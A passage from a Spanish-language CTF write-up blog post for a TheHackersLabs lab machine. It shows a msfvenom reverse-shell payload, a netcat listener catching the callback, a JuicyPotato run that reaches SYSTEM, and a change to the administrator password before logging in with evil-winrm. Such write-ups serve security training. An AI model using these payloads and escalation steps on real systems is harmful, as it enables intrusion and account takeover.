+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        1/23/2025   8:13 PM         347648 JuicyPotato.exe
+</span></span><span style="display:flex;"><span>-a----        6/30/2024   7:19 PM             15 perico.txt
+</span></span><span style="display:flex;"><span>-a----        6/27/2024  12:57 PM             29 user.txt
+</span></span></code></pre></div><p>Ahí lo tenemos.</p>
+<p>Abrimos una <strong>netcat</strong> en nuestra máquina usando <strong>rlwrap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ahora, necesitamos usar un binario de <strong>netcat</strong> que nos permita mandar la conexión hacia nuestra <strong>netcat</strong> o crear y usar una <strong>Reverse Shell</strong>.</p>
+<p>En mi caso voy a crear y usar una <strong>Reverse Shell</strong>. La creamos con <strong>msfvenom</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>Tu_IP LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> EXITFUNC<span style="color:#f92672">=</span>thread -f exe -a x86 --platform windows -o shell.exe
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">324</span> bytes
+</span></span><span style="display:flex;"><span>Final size of exe file: <span style="color:#ae81ff">73802</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.exe
+</span></span></code></pre></div><p>Listo, creado.</p>
+<p>Carguémosla a nuestra sesión de <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; upload shell.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Uploading /../TheHackersLabs/Chimichurri/content/shell.exe to C:\Users\hacker\Desktop\shell.exe
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: 98400 bytes of 98400 bytes copied
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Upload successful!
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directorio: C:\Users\hacker\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-a----        1/23/2025   8:13 PM         347648 JuicyPotato.exe
+</span></span><span style="display:flex;"><span>-a----        6/30/2024   7:19 PM             15 perico.txt
+</span></span><span style="display:flex;"><span>-a----        1/23/2025   8:15 PM          73802 shell.exe
+</span></span><span style="display:flex;"><span>-a----        6/27/2024  12:57 PM             29 user.txt
+</span></span></code></pre></div><p>Con todo esto listo, ya podemos usar <strong>Juicy Potato</strong>.</p>
+<p>Ejecutémoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Desktop&gt; ./JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 443 -a <span style="color:#e6db74">&#34;/c C:\Users\hacker\Desktop\shell.exe&#34;</span>
+</span></span><span style="display:flex;"><span>Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
+</span></span><span style="display:flex;"><span>......
+</span></span><span style="display:flex;"><span>[+] authresult 0
+</span></span><span style="display:flex;"><span>{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[+] CreateProcessWithTokenW OK
+</span></span></code></pre></div><p>No fue necesario usar un <strong>CLSID</strong> específico.</p>
+<p>Y revisando nuestra <strong>netcat</strong>, ya seremos el <strong>usuario Administrador</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>rlwrap nc -nlvp 443
+</span></span><span style="display:flex;"><span>listening on [any] 443 ...
+</span></span><span style="display:flex;"><span>connect to [Tu_IP] from (UNKNOWN) [192.168.1.50] 54684
+</span></span><span style="display:flex;"><span>Microsoft Windows [Versi�n 10.0.14393]
+</span></span><span style="display:flex;"><span>(c) 2016 Microsoft Corporation. Todos los derechos reservados.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Windows\system32<span style="color:#75715e">&gt;whoami</span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>nt authority\system
+</span></span></code></pre></div><p>El problema es que aún no podremos ver las flags:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Users\hacker\Desktop<span style="color:#75715e">&gt;type user.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> user.txt
+</span></span><span style="display:flex;"><span>Acceso denegado.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt;type root.txt</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">type</span> root.txt
+</span></span><span style="display:flex;"><span>Acceso denegado.
+</span></span></code></pre></div><p>Por alguna razón, si cambiamos la contraseña del <strong>usuario administrador</strong>, ya nos dejará ver las flags.</p>
+<p>Cambiemos la contraseña del administrador:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>C:\Users\Administrador\Desktop<span style="color:#75715e">&gt; net user Administrador hackeado123$!</span>
+</span></span><span style="display:flex;"><span>Se ha completado el comando correctamente.
+</span></span></code></pre></div><p>Y nos conectamos con <strong>evil-winrm</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.1.50 -u &#39;Administrador&#39; -p &#39;hackeado123$!&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\Administrador\Documents&gt;
+</span></span></code></pre></div><p>Ahora sí, podremos ver las flags y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.exploit-db.com/exploits/51993" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/51993</a></li><li><a href="https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability" target="_blank" rel="noopener noreferrer">https://www.cloudsek.com/blog/xposing-the-exploitation-how-cve-2024-23897-led-to-the-compromise-of-github-repos-via-jenkins-lfi-vulnerability</a></li><li><a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" target="_blank" rel="noopener noreferrer">https://github.com/ohpe/juicy-potato/releases/tag/v0.1</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-Bridgenton/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Bridgenton - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-mortadela/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Mortadela - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
